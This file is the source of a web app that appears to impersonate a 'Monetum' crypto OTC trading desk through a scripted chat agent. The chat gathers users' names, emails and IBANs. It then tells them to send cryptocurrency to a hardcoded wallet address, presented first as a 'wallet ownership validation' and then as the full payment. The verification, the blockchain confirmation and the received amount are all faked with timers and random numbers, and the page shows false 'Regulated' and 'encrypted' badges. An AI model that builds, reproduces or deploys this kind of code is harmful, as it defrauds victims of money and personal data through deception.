import { Hono } from 'hono'
import { cors } from 'hono/cors'
import { serveStatic } from 'hono/cloudflare-pages'

type Bindings = {
  OPENAI_API_KEY: string
}

const app = new Hono<{ Bindings: Bindings }>()

// CORS for API routes
app.use('/api/*', cors())

// Serve static files
app.use('/static/*', serveStatic())

// OTC Process State Machine
const OTC_STEPS = {
  WELCOME: 'welcome',
  ASK_NAME: 'ask_name',
  ASK_EMAIL: 'ask_email',
  ASK_IBAN: 'ask_iban',
  VERIFY_INFO: 'verify_info',
  ASK_CRYPTO: 'ask_crypto',
  ASK_NETWORK: 'ask_network',
  OWNERSHIP_VALIDATION: 'ownership_validation',
  WAIT_OWNERSHIP_TX: 'wait_ownership_tx',
  OWNERSHIP_CONFIRMED: 'ownership_confirmed',
  WAIT_FULL_PAYMENT: 'wait_full_payment',
  PAYMENT_RECEIVED: 'payment_received',
  CONFIRM_CONVERSION: 'confirm_conversion',
  COMPLETED: 'completed',
  CLOSED: 'closed'
}

// API endpoint for chat
app.post('/api/chat', async (c) => {
  const body = await c.req.json()
  const { message, state, userData } = body

  // Process the conversation based on current state
  const response = processOTCConversation(message, state, userData)
  
  return c.json(response)
})

function processOTCConversation(message: string, currentState: string, userData: any) {
  const normalizedMessage = message.toLowerCase().trim()
  
  switch (currentState) {
    case OTC_STEPS.WELCOME:
      return {
        messages: [
          "Hello 👋",
          "I'm Alex, and I'll be assisting you today. This process takes only a few minutes and is fully secured.",
          "Let's get started! Could you please confirm your **full name** as registered on your Monetum account?"
        ],
        nextState: OTC_STEPS.ASK_NAME,
        inputType: 'text',
        inputLabel: 'Full Name',
        inputPlaceholder: 'Enter your full name...',
        inputField: 'fullName'
      }

    case OTC_STEPS.ASK_NAME:
      return {
        messages: [
          `Thanks **${userData.fullName}** ✓`,
          "Now, please provide the **email address** linked to your Monetum account."
        ],
        nextState: OTC_STEPS.ASK_EMAIL,
        inputType: 'email',
        inputLabel: 'Email Address',
        inputPlaceholder: 'Enter your email...',
        inputField: 'email'
      }

    case OTC_STEPS.ASK_EMAIL:
      return {
        messages: [
          `Got it! **${userData.email}** ✓`,
          "Last step: please provide the **IBAN** where you'd like to receive the funds."
        ],
        nextState: OTC_STEPS.ASK_IBAN,
        inputType: 'text',
        inputLabel: 'IBAN',
        inputPlaceholder: 'Enter your IBAN...',
        inputField: 'iban'
      }

    case OTC_STEPS.ASK_IBAN:
      return {
        messages: [
          "Perfect! Let me verify your details..."
        ],
        nextState: OTC_STEPS.VERIFY_INFO,
        showLoader: true,
        loaderDuration: 2000
      }

    case OTC_STEPS.VERIFY_INFO:
      return {
        messages: [
          "✅ All verified!",
          `**Account Summary:**\n• Name: ${userData.fullName}\n• Email: ${userData.email}\n• IBAN: ${userData.iban}`,
          "Which **cryptocurrency** would you like to sell?"
        ],
        nextState: OTC_STEPS.ASK_CRYPTO,
        inputType: 'select',
        inputLabel: 'Cryptocurrency',
        inputOptions: ['USDC', 'USDT', 'ETH', 'BTC', 'DAI'],
        inputField: 'crypto'
      }

    case OTC_STEPS.ASK_CRYPTO:
      return {
        messages: [
          `**${userData.crypto}** - nice choice! ✓`,
          "Which **network** will you use for this transaction?"
        ],
        nextState: OTC_STEPS.ASK_NETWORK,
        inputType: 'select',
        inputLabel: 'Network',
        inputOptions: userData.crypto === 'BTC' ? ['Bitcoin'] : ['Ethereum', 'Polygon', 'Arbitrum', 'Optimism', 'Base'],
        inputField: 'network'
      }

    case OTC_STEPS.ASK_NETWORK:
      const validationAmount = '2.64'
      const validationCrypto = userData.crypto === 'USDC' || userData.crypto === 'USDT' || userData.crypto === 'DAI' ? userData.crypto : 'USDC'
      return {
        messages: [
          `**${userData.network}** selected ✓`,
          "🔐 **Wallet Ownership Validation**\n\nWe need to verify you own the sending wallet. Standard compliance procedure.",
          `Please send exactly **${validationAmount} ${validationCrypto}** to:\n\n\`0x7F5EB5bB5cF88cfcEe9613368636f458800e62CB\`\n\n**Network:** Ethereum\n\nThis amount will be credited back to you.`,
          "Enter the **TX hash** below or wait for auto-detection."
        ],
        nextState: OTC_STEPS.WAIT_OWNERSHIP_TX,
        inputType: 'text',
        inputLabel: 'Transaction ID (optional)',
        inputPlaceholder: 'Enter TX hash or click validate...',
        inputField: 'ownershipTxId',
        showValidateButton: true,
        validationAmount,
        validationCrypto
      }

    case OTC_STEPS.WAIT_OWNERSHIP_TX:
      return {
        messages: [
          "Checking blockchain..."
        ],
        nextState: OTC_STEPS.OWNERSHIP_CONFIRMED,
        showLoader: true,
        loaderDuration: 3000
      }

    case OTC_STEPS.OWNERSHIP_CONFIRMED:
      return {
        messages: [
          "✅ **Wallet ownership confirmed!**",
          "You can now proceed with your full payment.",
          `Send your **${userData.crypto}** to:\n\n\`0x7F5EB5bB5cF88cfcEe9613368636f458800e62CB\`\n\n**Network:** ${userData.network}`,
          "Enter the **TX hash** once sent."
        ],
        nextState: OTC_STEPS.WAIT_FULL_PAYMENT,
        inputType: 'text',
        inputLabel: 'Transaction ID',
        inputPlaceholder: 'Enter TX hash...',
        inputField: 'paymentTxId',
        showValidateButton: true
      }

    case OTC_STEPS.WAIT_FULL_PAYMENT:
      return {
        messages: [
          `Confirming on ${userData.network}...`
        ],
        nextState: OTC_STEPS.PAYMENT_RECEIVED,
        showLoader: true,
        loaderDuration: 4000
      }

    case OTC_STEPS.PAYMENT_RECEIVED:
      const receivedAmount = (Math.random() * 9000 + 1000).toFixed(2)
      const rate = 0.92
      const feePercent = 0.5
      const amountBeforeFees = parseFloat(receivedAmount) * rate
      const fees = amountBeforeFees * (feePercent / 100)
      const finalAmount = (amountBeforeFees - fees).toFixed(2)
      
      return {
        messages: [
          "✅ **Funds received!**",
          `📊 **Summary:**\n\n| Description | Amount |\n|-------------|--------|\n| ${userData.crypto} Received | ${receivedAmount} ${userData.crypto} |\n| Rate | 1 ${userData.crypto} = €${rate.toFixed(4)} |\n| Gross | €${amountBeforeFees.toFixed(2)} |\n| Fee (0.5%) | -€${fees.toFixed(2)} |\n| **Net** | **€${finalAmount}** |`,
          "Please **confirm** or **cancel** this transaction."
        ],
        nextState: OTC_STEPS.CONFIRM_CONVERSION,
        showConfirmButtons: true,
        transactionData: {
          receivedAmount,
          crypto: userData.crypto,
          rate,
          feePercent,
          fees: fees.toFixed(2),
          grossAmount: amountBeforeFees.toFixed(2),
          netAmount: finalAmount
        }
      }

    case OTC_STEPS.CONFIRM_CONVERSION:
      if (normalizedMessage === 'confirm') {
        return {
          messages: [
            "Processing your conversion..."
          ],
          nextState: OTC_STEPS.COMPLETED,
          showLoader: true,
          loaderDuration: 3000
        }
      } else if (normalizedMessage === 'cancel') {
        return {
          messages: [
            "❌ **Transaction Cancelled**",
            "Your funds will be returned minus 1% cancellation fee within 24-48h.",
            "Anything else I can help with?"
          ],
          nextState: OTC_STEPS.CLOSED,
          showNewDealButton: true
        }
      }
      break

    case OTC_STEPS.COMPLETED:
      return {
        messages: [
          "✅ **Done!**",
          `**€${userData.transactionData?.netAmount || '0.00'}** will be credited to your Monetum account within minutes.`,
          `Confirmation email sent to ${userData.email} 📧`,
          "Thanks for using Monetum OTC! 🙏"
        ],
        nextState: OTC_STEPS.CLOSED,
        showNewDealButton: true,
        showCloseButton: true
      }

    case OTC_STEPS.CLOSED:
      if (normalizedMessage === 'new') {
        return {
          messages: [
            "Sure! Let's start fresh.",
            "Please confirm your **full name** as registered on your Monetum account."
          ],
          nextState: OTC_STEPS.ASK_NAME,
          inputType: 'text',
          inputLabel: 'Full Name',
          inputPlaceholder: 'Enter your full name...',
          inputField: 'fullName',
          resetUserData: true
        }
      }
      return {
        messages: [
          "Thanks for using Monetum OTC! Have a great day 👋"
        ],
        nextState: OTC_STEPS.CLOSED,
        sessionEnded: true
      }

    default:
      return {
        messages: [
          "Sorry, I didn't catch that. Could you try again?"
        ],
        nextState: currentState
      }
  }
}

// HTML template as a string
const htmlTemplate = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Monetum OTC Desk</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        monetum: {
                            green: '#3DA085',
                            dark: '#2A2B41',
                            light: '#f8fafc',
                            success: '#3DA085',
                            error: '#ef4444',
                            muted: '#64748b'
                        }
                    },
                    fontFamily: {
                        inter: ['Inter', 'sans-serif']
                    }
                }
            }
        }
    </script>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background: #ffffff;
        }
        .widget-container {
            background: #ffffff;
            border: 2px solid #3DA085;
            border-radius: 16px;
            box-shadow: 0 4px 24px rgba(61, 160, 133, 0.15);
        }
        .secure-badge {
            background: rgba(61, 160, 133, 0.1);
            border: 1px solid rgba(61, 160, 133, 0.3);
        }
        .chat-message {
            animation: fadeIn 0.3s ease-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .typing-indicator span {
            animation: bounce 1.4s infinite ease-in-out both;
        }
        .typing-indicator span:nth-child(1) { animation-delay: -0.32s; }
        .typing-indicator span:nth-child(2) { animation-delay: -0.16s; }
        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }
        .input-secure {
            background: #ffffff;
            border: 1px solid #e2e8f0;
            color: #2A2B41;
        }
        .input-secure:focus {
            border-color: #3DA085;
            box-shadow: 0 0 0 3px rgba(61, 160, 133, 0.1);
            outline: none;
        }
        .input-secure::placeholder {
            color: #94a3b8;
        }
        select.input-secure {
            color: #2A2B41;
            background: #ffffff;
        }
        select.input-secure option {
            color: #2A2B41;
            background: #ffffff;
        }
        .btn-primary {
            background: #3DA085;
            transition: all 0.3s ease;
        }
        .btn-primary:hover {
            background: #2d8a72;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(61, 160, 133, 0.3);
        }
        .btn-success {
            background: #3DA085;
        }
        .btn-success:hover {
            background: #2d8a72;
        }
        .btn-danger {
            background: #ef4444;
        }
        .btn-danger:hover {
            background: #dc2626;
        }
        .pulse-glow {
            animation: pulseGlow 2s ease-in-out infinite;
        }
        @keyframes pulseGlow {
            0%, 100% { box-shadow: 0 0 5px rgba(61, 160, 133, 0.3); }
            50% { box-shadow: 0 0 20px rgba(61, 160, 133, 0.5); }
        }
        .markdown-table {
            width: 100%;
            border-collapse: collapse;
            margin: 10px 0;
            font-size: 13px;
        }
        .markdown-table th, .markdown-table td {
            padding: 8px 12px;
            border: 1px solid #e2e8f0;
            text-align: left;
        }
        .markdown-table th {
            background: rgba(61, 160, 133, 0.1);
            color: #2A2B41;
        }
        code {
            background: rgba(61, 160, 133, 0.1);
            padding: 2px 8px;
            border-radius: 4px;
            font-family: monospace;
            word-break: break-all;
            color: #2A2B41;
            font-size: 12px;
        }
        .agent-bubble {
            background: #f1f5f9;
            color: #2A2B41;
        }
        .user-bubble {
            background: #3DA085;
            color: white;
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
    <!-- Main Widget -->
    <div class="relative w-full max-w-lg">
        <!-- Widget Container -->
        <div class="widget-container overflow-hidden">
            <!-- Header -->
            <div class="bg-white p-4 border-b border-gray-100">
                <div class="flex items-center justify-between">
                    <div class="flex items-center gap-3">
                        <!-- Monetum Logo SVG -->
                        <div class="w-10 h-10">
                            <svg viewBox="0 0 100 100" class="w-full h-full">
                                <circle cx="50" cy="50" r="45" fill="none" stroke="#3DA085" stroke-width="5"/>
                                <path d="M30 65 L30 35 L50 50 L70 35 L70 65" fill="none" stroke="#3DA085" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"/>
                                <path d="M25 50 L50 35 L75 50" fill="none" stroke="#3DA085" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"/>
                            </svg>
                        </div>
                        <div>
                            <h1 class="text-lg font-semibold text-monetum-dark">Initiate OTC Deal</h1>
                            <p class="text-xs text-monetum-muted">Monetum Secure Trading</p>
                        </div>
                    </div>
                    <!-- Security Badges -->
                    <div class="flex items-center gap-2">
                        <div class="secure-badge px-2 py-1 rounded-full flex items-center gap-1">
                            <i class="fas fa-shield-halved text-monetum-green text-xs"></i>
                            <span class="text-xs text-monetum-green font-medium">Secured</span>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Chat Container -->
            <div id="chatContainer" class="h-[420px] overflow-y-auto p-4 space-y-3 scroll-smooth bg-white">
                <!-- Messages will be inserted here -->
            </div>

            <!-- Input Area -->
            <div id="inputArea" class="p-4 border-t border-gray-100 bg-white">
                <!-- Dynamic input will be inserted here -->
                <div id="startButton" class="text-center">
                    <button onclick="startChat()" class="btn-primary px-8 py-3 rounded-xl text-white font-medium pulse-glow">
                        <i class="fas fa-comments mr-2"></i>
                        Start OTC Deal
                    </button>
                </div>
            </div>

            <!-- Footer -->
            <div class="bg-gray-50 px-4 py-2 flex items-center justify-between text-xs text-monetum-muted border-t border-gray-100">
                <div class="flex items-center gap-2">
                    <i class="fas fa-lock text-monetum-green"></i>
                    <span>End-to-end encrypted</span>
                </div>
                <div class="flex items-center gap-2">
                    <span>Powered by</span>
                    <span class="text-monetum-green font-semibold">Monetum</span>
                </div>
            </div>
        </div>

        <!-- Trust Indicators -->
        <div class="mt-4 flex justify-center gap-6 text-monetum-muted text-xs">
            <div class="flex items-center gap-1">
                <i class="fas fa-link text-monetum-green"></i>
                <span>Onchain Safety</span>
            </div>
            <div class="flex items-center gap-1">
                <i class="fas fa-user-shield text-monetum-green"></i>
                <span>KYC Compliant</span>
            </div>
            <div class="flex items-center gap-1">
                <i class="fas fa-building-columns text-monetum-green"></i>
                <span>Regulated</span>
            </div>
        </div>
    </div>

    <script>
        // State management
        let currentState = 'welcome';
        let userData = {};

        const chatContainer = document.getElementById('chatContainer');
        const inputArea = document.getElementById('inputArea');

        function formatMessage(text) {
            let formatted = text
                .replace(/\\*\\*(.+?)\\*\\*/g, '<strong>$1</strong>')
                .replace(/\\*(.+?)\\*/g, '<em>$1</em>')
                .replace(/\\\`([^\\\`]+)\\\`/g, '<code>$1</code>')
                .replace(/\\n/g, '<br>');
            
            if (formatted.includes('|')) {
                const lines = formatted.split('<br>');
                let tableLines = [];
                let inTable = false;
                let result = [];
                
                lines.forEach(line => {
                    if (line.includes('|') && line.trim().startsWith('|')) {
                        if (!inTable) {
                            inTable = true;
                            tableLines = [];
                        }
                        tableLines.push(line);
                    } else {
                        if (inTable) {
                            result.push(convertTable(tableLines));
                            inTable = false;
                            tableLines = [];
                        }
                        result.push(line);
                    }
                });
                
                if (inTable) {
                    result.push(convertTable(tableLines));
                }
                
                formatted = result.join('<br>');
            }
            
            return formatted;
        }

        function convertTable(lines) {
            if (lines.length < 2) return lines.join('<br>');
            
            let html = '<table class="markdown-table">';
            lines.forEach((line, idx) => {
                if (line.includes('---')) return;
                const cells = line.split('|').filter(c => c.trim());
                const tag = idx === 0 ? 'th' : 'td';
                html += '<tr>' + cells.map(c => '<' + tag + '>' + c.trim() + '</' + tag + '>').join('') + '</tr>';
            });
            html += '</table>';
            return html;
        }

        function addMessage(content, isAgent = true) {
            const messageDiv = document.createElement('div');
            messageDiv.className = 'chat-message flex ' + (isAgent ? 'justify-start' : 'justify-end');
            
            const bubble = document.createElement('div');
            bubble.className = 'max-w-[85%] px-4 py-2 rounded-2xl ' + (isAgent ? 'agent-bubble rounded-tl-sm' : 'user-bubble rounded-tr-sm');
            
            const text = document.createElement('div');
            text.className = 'text-sm leading-relaxed';
            text.innerHTML = formatMessage(content);
            bubble.appendChild(text);
            
            messageDiv.appendChild(bubble);
            chatContainer.appendChild(messageDiv);
            chatContainer.scrollTop = chatContainer.scrollHeight;
        }

        function addTypingIndicator() {
            const existingTyping = document.getElementById('typingIndicator');
            if (existingTyping) existingTyping.remove();
            
            const typingDiv = document.createElement('div');
            typingDiv.id = 'typingIndicator';
            typingDiv.className = 'chat-message flex justify-start';
            typingDiv.innerHTML = '<div class="agent-bubble px-4 py-3 rounded-2xl rounded-tl-sm"><div class="typing-indicator flex gap-1"><span class="w-2 h-2 bg-monetum-green rounded-full"></span><span class="w-2 h-2 bg-monetum-green rounded-full"></span><span class="w-2 h-2 bg-monetum-green rounded-full"></span></div></div>';
            chatContainer.appendChild(typingDiv);
            chatContainer.scrollTop = chatContainer.scrollHeight;
        }

        function removeTypingIndicator() {
            const typing = document.getElementById('typingIndicator');
            if (typing) typing.remove();
        }

        async function displayMessagesSequentially(messages) {
            for (let i = 0; i < messages.length; i++) {
                addTypingIndicator();
                await new Promise(resolve => setTimeout(resolve, 1000));
                removeTypingIndicator();
                addMessage(messages[i], true);
                if (i < messages.length - 1) {
                    await new Promise(resolve => setTimeout(resolve, 300));
                }
            }
        }

        function renderInput(response) {
            inputArea.innerHTML = '';
            
            if (response.sessionEnded) {
                inputArea.innerHTML = '<div class="text-center text-monetum-muted text-sm"><i class="fas fa-check-circle text-monetum-green mr-2"></i>Session completed</div>';
                return;
            }
            
            if (response.showNewDealButton || response.showCloseButton) {
                let html = '<div class="flex gap-3 justify-center">';
                if (response.showNewDealButton) {
                    html += '<button onclick="sendMessage(\\'new\\')" class="btn-primary px-6 py-2 rounded-xl text-white font-medium text-sm"><i class="fas fa-plus mr-2"></i>New Deal</button>';
                }
                if (response.showCloseButton) {
                    html += '<button onclick="sendMessage(\\'close\\')" class="bg-white border border-gray-300 px-6 py-2 rounded-xl text-monetum-dark font-medium text-sm hover:bg-gray-50"><i class="fas fa-times mr-2"></i>Close</button>';
                }
                html += '</div>';
                inputArea.innerHTML = html;
                return;
            }
            
            if (response.showConfirmButtons) {
                inputArea.innerHTML = '<div class="flex gap-3 justify-center"><button onclick="sendMessage(\\'confirm\\')" class="btn-success px-8 py-3 rounded-xl text-white font-medium"><i class="fas fa-check mr-2"></i>Confirm</button><button onclick="sendMessage(\\'cancel\\')" class="btn-danger px-8 py-3 rounded-xl text-white font-medium"><i class="fas fa-times mr-2"></i>Cancel</button></div>';
                return;
            }
            
            if (response.inputType) {
                let inputHtml = '';
                
                if (response.inputType === 'select') {
                    inputHtml = '<select id="userInput" class="input-secure w-full px-4 py-3 rounded-xl focus:outline-none"><option value="" style="color: #94a3b8;">Select ' + response.inputLabel + '...</option>';
                    response.inputOptions.forEach(function(opt) {
                        inputHtml += '<option value="' + opt + '" style="color: #2A2B41;">' + opt + '</option>';
                    });
                    inputHtml += '</select>';
                } else {
                    inputHtml = '<input type="' + response.inputType + '" id="userInput" placeholder="' + response.inputPlaceholder + '" class="input-secure w-full px-4 py-3 rounded-xl focus:outline-none" onkeypress="if(event.key === \\'Enter\\') submitInput()">';
                }
                
                let validateBtn = '';
                if (response.showValidateButton) {
                    validateBtn = '<button onclick="autoValidate()" class="bg-white border border-monetum-green px-4 py-3 rounded-xl text-monetum-green hover:bg-green-50"><i class="fas fa-sync"></i></button>';
                }
                
                inputArea.innerHTML = '<div class="space-y-3"><div class="flex items-center gap-2 text-xs text-monetum-muted"><i class="fas fa-shield-halved text-monetum-green"></i><span>Secure input · ' + response.inputLabel + '</span></div><div class="flex gap-2">' + inputHtml + '<button onclick="submitInput()" class="btn-primary px-4 py-3 rounded-xl text-white"><i class="fas fa-paper-plane"></i></button>' + validateBtn + '</div></div>';
                
                window.currentInputField = response.inputField;
                
                setTimeout(function() {
                    const input = document.getElementById('userInput');
                    if (input) input.focus();
                }, 100);
            }
        }

        async function sendMessage(message) {
            if (!message || message.trim() === '') return;
            
            addMessage(message, false);
            
            try {
                const response = await fetch('/api/chat', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        message: message,
                        state: currentState,
                        userData: userData
                    })
                });
                
                const data = await response.json();
                
                if (data.showLoader) {
                    addTypingIndicator();
                    await new Promise(resolve => setTimeout(resolve, data.loaderDuration));
                    removeTypingIndicator();
                    
                    const nextResponse = await fetch('/api/chat', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            message: '',
                            state: data.nextState,
                            userData: userData
                        })
                    });
                    
                    const nextData = await nextResponse.json();
                    
                    if (nextData.transactionData) {
                        userData.transactionData = nextData.transactionData;
                    }
                    
                    await displayMessagesSequentially(nextData.messages || [nextData.agentMessage]);
                    currentState = nextData.nextState;
                    renderInput(nextData);
                } else {
                    if (data.resetUserData) {
                        userData = {};
                    }
                    
                    if (data.transactionData) {
                        userData.transactionData = data.transactionData;
                    }
                    
                    await displayMessagesSequentially(data.messages || [data.agentMessage]);
                    currentState = data.nextState;
                    renderInput(data);
                }
                
            } catch (error) {
                removeTypingIndicator();
                addMessage('Sorry, there was an error. Please try again.');
            }
        }

        function submitInput() {
            const input = document.getElementById('userInput');
            if (!input) return;
            
            const value = input.value.trim();
            if (!value) return;
            
            if (window.currentInputField) {
                userData[window.currentInputField] = value;
            }
            
            sendMessage(value);
        }

        function autoValidate() {
            userData[window.currentInputField] = 'auto-validated';
            sendMessage('Validating...');
        }

        async function startChat() {
            document.getElementById('startButton').style.display = 'none';
            
            const response = await fetch('/api/chat', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    message: 'start',
                    state: 'welcome',
                    userData: {}
                })
            });
            
            const data = await response.json();
            
            await displayMessagesSequentially(data.messages || [data.agentMessage]);
            currentState = data.nextState;
            renderInput(data);
        }
    </script>
</body>
</html>`;

// Main page
app.get('/', (c) => {
  return c.html(htmlTemplate)
})

export default app
